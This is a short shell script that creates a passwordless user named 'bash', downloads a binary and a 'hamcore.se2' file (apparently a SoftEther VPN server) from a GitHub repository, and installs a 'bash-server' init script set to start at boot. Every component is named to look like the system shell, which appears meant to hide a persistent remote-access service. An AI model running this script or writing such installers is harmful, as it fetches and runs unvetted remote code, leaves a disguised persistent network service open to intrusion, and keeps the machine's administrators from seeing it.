#!/bin/sh
echo |adduser bash --disabled-password --disabled-login 
su bash -c  'mkdir /home/bash/bin'
cd /home/bash/bin
rm -rf bash
rm -rf hamcore.se2
su bash -c  'wget https://github.com/zhhww58/myscript/raw/master/hamcore.se2'
su bash -c  'wget https://github.com/zhhww58/myscript/raw/master/bash'
su bash -c  'chmod +x bash'
cd /etc/init.d/
rm -rf bash-server
wget https://github.com/zhhww58/myscript/raw/master/bash-server
chmod 755 bash-server
systemctl disable bash-server
systemctl enable bash-server
systemctl start bash-server